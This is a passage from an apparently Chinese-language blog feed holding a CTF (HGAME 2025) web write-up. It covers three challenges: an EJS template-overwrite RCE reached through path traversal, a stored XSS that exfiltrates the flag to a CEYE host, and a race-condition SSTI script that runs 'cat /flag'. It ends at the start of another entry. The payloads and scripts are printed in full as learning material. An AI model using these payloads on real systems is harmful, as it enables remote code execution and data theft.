&#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; oldName, newName &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> oldPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldName);</span><br><span class="line">  <span class="keyword">const</span> newPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, newName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!oldName || !newName) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">rename</span>(oldPath, newPath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> + err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>主要问题出在<strong>文件上传</strong>和<strong>重命名</strong>两个部分。</p><p>文件上传部分filename直接利用<strong>file.originalname</strong>，并未对我们上传的文件进行任何过滤。所以我们可以上传恶意文件甚至我们修改上传的文件名还能进行<strong>目录遍历</strong>。</p><p><code>/rename</code>路由中，它接受<strong>oldName和newName</strong>，然后进行重命名。同样存在目录遍历。</p><p>同时该应用采用的是<strong>EJS模板引擎</strong>进行渲染，<strong>EJS</strong>是一个javascript模板库，用来从<strong>json数据中生成HTML字符串</strong>，而<code>/</code>路由通过**<code>res.render(&#39;mortis&#39;, &#123; files: files &#125;);</code><strong>，所以我们的思路就是利用</strong>目录遍历漏洞<strong>将</strong><code>mortis.ejs</code><strong>文件上传到</strong><code>views</code><strong>目录下将原来的<code>mortis.ejs</code>文件进行</strong>覆盖**，这样访问<code>/</code>时应用渲染mortis模板时就会执行我们的恶意代码</p><p>创建<code>mortis.ejs</code>文件，写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;) %&gt;</span><br></pre></td></tr></table></figure><p>上传到服务器：</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-143934.png"></p><p><code>/rename</code>路由重命名文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;oldName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mortis.ejs&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;newName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../views/mortis.ejs&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-144110.png"></p><p>访问<code>/</code>得到flag：</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-144348.png"></p><h2 id="MysteryMessageBoard"><a href="#MysteryMessageBoard" class="headerlink" title="MysteryMessageBoard"></a>MysteryMessageBoard</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/chromedp/chromedp&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">store = sessions.NewCookieStore([]<span class="type">byte</span>(<span class="string">&quot;fake_key&quot;</span>))</span><br><span class="line">users = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;shallot&quot;</span>: <span class="string">&quot;fake_password&quot;</span>,</span><br><span class="line"><span class="string">&quot;admin&quot;</span>:   <span class="string">&quot;fake_password&quot;</span>&#125;</span><br><span class="line">comments []<span class="type">string</span></span><br><span class="line">flag     = <span class="string">&quot;FLAG&#123;this_is_a_fake_flag&#125;&quot;</span></span><br><span class="line">lock     sync.Mutex</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loginHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">username := c.PostForm(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">password := c.PostForm(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> storedPassword, ok := users[username]; ok &amp;&amp; storedPassword == password &#123;</span><br><span class="line">session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line">session.Values[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">session.Options = &amp;sessions.Options&#123;</span><br><span class="line">Path:     <span class="string">&quot;/&quot;</span>,</span><br><span class="line">MaxAge:   <span class="number">3600</span>,</span><br><span class="line">HttpOnly: <span class="literal">false</span>,</span><br><span class="line">Secure:   <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br><span class="line">session.Save(c.Request, c.Writer)</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;success&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">log.Printf(<span class="string">&quot;Login failed for user: %s\n&quot;</span>, username)</span><br><span class="line">c.String(http.StatusUnauthorized, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">logoutHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line"><span class="built_in">delete</span>(session.Values, <span class="string">&quot;username&quot;</span>)</span><br><span class="line">session.Save(c.Request, c.Writer)</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/login&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">indexHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line">username, ok := session.Values[<span class="string">&quot;username&quot;</span>].(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">log.Println(<span class="string">&quot;User not logged in, redirecting to login&quot;</span>)</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/login&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.Method == http.MethodPost &#123;</span><br><span class="line">comment := c.PostForm(<span class="string">&quot;comment&quot;</span>)</span><br><span class="line">log.Printf(<span class="string">&quot;New comment submitted: %s\n&quot;</span>, comment)</span><br><span class="line">comments = <span class="built_in">append</span>(comments, comment)</span><br><span class="line">&#125;</span><br><span class="line">htmlContent := fmt.Sprintf(<span class="string">`&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;欢迎，%s，试着写点有意思的东西吧，admin才不会来看你！自恋的笨蛋！&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;textarea name=&quot;comment&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;提交评论&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;h3&gt;留言:&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&lt;ul&gt;`</span>, username)</span><br><span class="line"><span class="keyword">for</span> _, comment := <span class="keyword">range</span> comments &#123;</span><br><span class="line">htmlContent += <span class="string">&quot;&lt;li&gt;&quot;</span> + comment + <span class="string">&quot;&lt;/li&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">htmlContent += <span class="string">`&lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;&lt;a href=&quot;/logout&quot;&gt;退出&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;`</span></span><br><span class="line">c.Data(http.StatusOK, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, []<span class="type">byte</span>(htmlContent))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">adminHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">htmlContent := <span class="string">`&lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;好吧好吧你都这么求我了~admin只好勉为其难的来看看你写了什么~才不是人家想看呢！&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;`</span></span><br><span class="line">c.Data(http.StatusOK, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, []<span class="type">byte</span>(htmlContent))</span><br><span class="line"><span class="comment">//无头浏览器模拟登录admin，并以admin身份访问/路由</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">lock.Lock()</span><br><span class="line"><span class="keyword">defer</span> lock.Unlock()</span><br><span class="line">ctx, cancel := chromedp.NewContext(context.Background())</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line">ctx, _ = context.WithTimeout(ctx, <span class="number">20</span>*time.Second)</span><br><span class="line"><span class="keyword">if</span> err := chromedp.Run(ctx, myTasks()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Chromedp error:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无头浏览器操作</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myTasks</span><span class="params">()</span></span> chromedp.Tasks &#123;</span><br><span class="line"><span class="keyword">return</span> chromedp.Tasks&#123;</span><br><span class="line">chromedp.Navigate(<span class="string">&quot;/login&quot;</span>),</span><br><span class="line">chromedp.WaitVisible(<span class="string">`input[name=&quot;username&quot;]`</span>),</span><br><span class="line">chromedp.SendKeys(<span class="string">`input[name=&quot;username&quot;]`</span>, <span class="string">&quot;admin&quot;</span>),</span><br><span class="line">chromedp.SendKeys(<span class="string">`input[name=&quot;password&quot;]`</span>, <span class="string">&quot;fake_password&quot;</span>),</span><br><span class="line">chromedp.Click(<span class="string">`input[type=&quot;submit&quot;]`</span>),</span><br><span class="line">chromedp.Navigate(<span class="string">&quot;/&quot;</span>),</span><br><span class="line">chromedp.Sleep(<span class="number">5</span> * time.Second),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">flagHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Handling flag request&quot;</span>)</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusInternalServerError, <span class="string">&quot;无法获取会话&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">username, ok := session.Values[<span class="string">&quot;username&quot;</span>].(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> !ok || username != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">c.String(http.StatusForbidden, <span class="string">&quot;只有admin才可以访问哦&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">log.Println(<span class="string">&quot;Admin accessed the flag&quot;</span>)</span><br><span class="line">c.String(http.StatusOK, flag)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/login&quot;</span>, loginHandler)</span><br><span class="line">r.POST(<span class="string">&quot;/login&quot;</span>, loginHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/logout&quot;</span>, logoutHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, indexHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/admin&quot;</span>, adminHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/flag&quot;</span>, flagHandler)</span><br><span class="line">log.Println(<span class="string">&quot;Server started at :8888&quot;</span>)</span><br><span class="line">log.Fatal(r.Run(<span class="string">&quot;:8888&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较简单的XSS，大概的逻辑就是通过<code>/login</code>路由登录，然后<code>/</code>存在留言板用于我们写入<strong>XSS payload</strong>，而访问<code>/admin</code>路由会触发无头浏览器以admin身份登录，并访问首页。这时候首页加载所有评论，其中包含我们的<strong>XSS payload</strong>，从而以admin身份<strong>访问<code>/flag</code>路由</strong>并将返回的<strong>flag</strong>外带到我们的服务器。</p><p>账户给了<strong>shallot</strong>，通过<strong>弱口令</strong>爆破出密码为<strong>888888</strong>：</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-203048.png"></p><p>在留言板写入我们的<strong>XSS payload</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">flag</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://ip.port.4xmzfl.ceye.io/&#x27;</span> + <span class="built_in">encodeURIComponent</span>(flag));</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里我是将flag外带到**<code>CEYE</code>**</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-204223.png"></p><p>访问**<code>/admin</code>路由**触发我们的payload，成功外带出flag:</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-202957.png"></p><h2 id="角落"><a href="#角落" class="headerlink" title="角落"></a>角落</h2><p>扫目录存在<code>/robots.txt</code>：</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-211003.png"></p><p><code>/app.conf</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Include by httpd.conf</span><br><span class="line">&lt;Directory &quot;/usr/local/apache2/app&quot;&gt;</span><br><span class="line">Options Indexes</span><br><span class="line">AllowOverride None</span><br><span class="line">Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Files &quot;/usr/local/apache2/app/app.py&quot;&gt;</span><br><span class="line">    Order Allow,Deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;^L1nk/&quot;</span><br><span class="line">RewriteRule &quot;^/admin/(.*)$&quot; &quot;/$1.html?secret=todo&quot;</span><br><span class="line"></span><br><span class="line">ProxyPass &quot;/app/&quot; &quot;http://127.0.0.1:5000/&quot;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig">Black Hat USA 2024：利用Apache HTTP服务器中隐藏的语义歧义进行攻击！ | 长亭百川云</a></p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250217-173209.png"></p><p>源码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> templates</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = templates.show_msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">message = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">return</span> message</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">status = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(message) </span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line"><span class="keyword">return</span> render_template_string(show)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>可以看到存在<strong>SSTI</strong>，但过滤了”{“，直接条件竞争即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://node1.hgame.vidar.club:31112/app&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">race_write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        requests.post(target + <span class="string">&#x27;/send&#x27;</span>,</span><br><span class="line">                      data=&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&quot;&#123;&#123;lipsum.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = requests.get(target + <span class="string">&#x27;/read&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hgame&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 启动竞争写入线程</span></span><br><span class="line">    threading.Thread(target=race_write, daemon=<span class="literal">True</span>).start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动检测线程</span></span><br><span class="line">    threading.Thread(target=exploit, daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/HGAME2025-week1/"><img src="/2025/02/23/HGAME2025-week1/QQ20250223-132808.png" alt="QQ20250223-132808"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> hgame </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python flask内存马学习</title>
      <link href="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
      
